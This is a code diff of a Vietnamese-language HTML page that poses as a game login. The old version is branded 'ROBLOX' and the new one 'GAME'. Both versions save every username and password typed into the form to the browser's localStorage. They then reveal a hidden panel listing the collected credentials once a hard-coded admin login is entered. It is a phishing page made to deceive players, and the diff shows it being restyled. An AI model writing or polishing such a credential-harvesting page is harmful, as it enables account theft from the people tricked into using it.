@@ -1,73 +1,66 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <style>
-        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; }
-        #nav { position: absolute; top: 10px; left: 10px; font-size: 14px; cursor: pointer; color: #aaa; display: none; border: 1px solid #444; padding: 5px; }
-        .container { width: 90%; max-width: 350px; margin: 100px auto; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 8px 0; background: #222; border: none; color: #fff; border-radius: 5px; }
-        button { width: 100%; padding: 12px; margin: 8px 0; background: #0084ff; border: none; color: #fff; font-weight: bold; cursor: pointer; }
-        #homeArea { display: none; padding: 20px; text-align: left; }
-        #vidOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; }
-        .log-item { background: #111; padding: 10px; margin: 5px 0; border: 1px solid #333; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo Login</title>
+<style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
+    body { min-height:100vh; display:flex; justify-content:center; align-items:center; background-image:url("Screenshot_2026-06-11-01-29-08-593-edit_com.ss.android.ugc.trill.jpg"); background-size:cover; background-position:center; }
+    .overlay { position:fixed; inset:0; background:rgba(0,0,0,.35); }
+    #home { position:fixed; top:20px; right:20px; display:none; padding:10px 15px; border-radius:12px; background:rgba(0,0,0,.6); color:white; font-weight:bold; cursor:pointer; z-index:10; }
+    .container { position:relative; z-index:2; width:360px; padding:30px; border-radius:20px; background:rgba(0,0,0,.45); backdrop-filter:blur(10px); }
+    .logo { color:white; text-align:center; font-size:48px; font-weight:bold; margin-bottom:30px; }
+    .input-box { margin-bottom:18px; }
+    .input-box input { width:100%; padding:15px; border:none; outline:none; border-radius:12px; background:rgba(0,0,0,.7); color:white; }
+    .btn { width:100%; padding:15px; border:none; border-radius:12px; font-size:18px; font-weight:bold; cursor:pointer; background:#0084ff; color:white; }
+    #dataDisplay { display:none; color:white; background:black; padding:20px; width:100%; height:100%; position:fixed; top:0; left:0; z-index:20; overflow-y:auto; }
+</style>
 </head>
 <body>
 
-<div id="nav" onclick="showHome()">Home</div>
+<div class="overlay"></div>
+<div id="home" onclick="showData()">Home</div>
 
-<div class="container" id="loginForm">
-    <h2>ROBLOX</h2>
-    <input type="text" id="user" placeholder="Tên người dùng">
-    <input type="password" id="pass" placeholder="Mật khẩu">
-    <button onclick="executeLogin()">Đăng nhập</button>
+<div class="container" id="loginBox">
+    <div class="logo">GAME</div>
+    <div class="input-box"><input type="text" id="username" placeholder="Tên người dùng"></div>
+    <div class="input-box"><input type="password" id="password" placeholder="Mật khẩu"></div>
+    <button class="btn" onclick="login()">Đăng nhập</button>
 </div>
 
-<div id="homeArea" class="container">
-    <h3>Dữ liệu đã thu thập:</h3>
-    <div id="dataList"></div>
-</div>
-
-<div id="vidOverlay">
-    <video id="vid" width="100%" height="100%" loop>
-        <source src="video.mp4" type="video/mp4">
-    </video>
+<div id="dataDisplay">
+    <h2>Danh sách đã đăng nhập:</h2>
+    <div id="logs"></div>
+    <button onclick="document.getElementById('dataDisplay').style.display='none'">Đóng</button>
 </div>
 
 <script>
-    function executeLogin() {
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
-        
-        // Thu thập và lưu vào mảng dữ liệu
-        let logs = JSON.parse(localStorage.getItem('all_logs') || '[]');
-        logs.push({user: u, pass: p});
-        localStorage.setItem('all_logs', JSON.stringify(logs));
-        
-        // Kích hoạt video
-        document.getElementById('vidOverlay').style.display = 'block';
-        const v = document.getElementById('vid');
-        v.volume = 1.0;
-        v.play();
+const ADMIN_USER = "gg36";
+const ADMIN_PASS = "3667";
 
-        if(u === "gg3636" && p === "36thanhhoa") {
-            document.getElementById('nav').style.display = 'block';
-        }
-    }
+function login(){
+    const u = document.getElementById("username").value.trim();
+    const p = document.getElementById("password").value;
 
-    function showHome() {
-        document.getElementById('loginForm').style.display = 'none';
-        document.getElementById('vidOverlay').style.display = 'none';
-        document.getElementById('homeArea').style.display = 'block';
-        
-        let logs = JSON.parse(localStorage.getItem('all_logs') || '[]');
-        let html = '';
-        logs.forEach(item => {
-            html += `<div class="log-item">Tên: ${item.user} | MK: ${item.pass}</div>`;
-        });
-        document.getElementById('dataList').innerHTML = html;
+    // Lưu mọi lượt đăng nhập vào localStorage
+    let logs = JSON.parse(localStorage.getItem('user_logs') || '[]');
+    logs.push({user: u, pass: p});
+    localStorage.setItem('user_logs', JSON.stringify(logs));
+
+    // Kiểm tra quyền mở khóa Home
+    if(u === ADMIN_USER && p === ADMIN_PASS){
+        document.getElementById("home").style.display = "block";
     }
+}
+
+function showData() {
+    let logs = JSON.parse(localStorage.getItem('user_logs') || '[]');
+    let html = logs.map(l => `<p>User: ${l.user} | Pass: ${l.pass}</p>`).join('');
+    document.getElementById("logs").innerHTML = html;
+    document.getElementById("dataDisplay").style.display = "block";
+}
 </script>
+
 </body>
 </html>
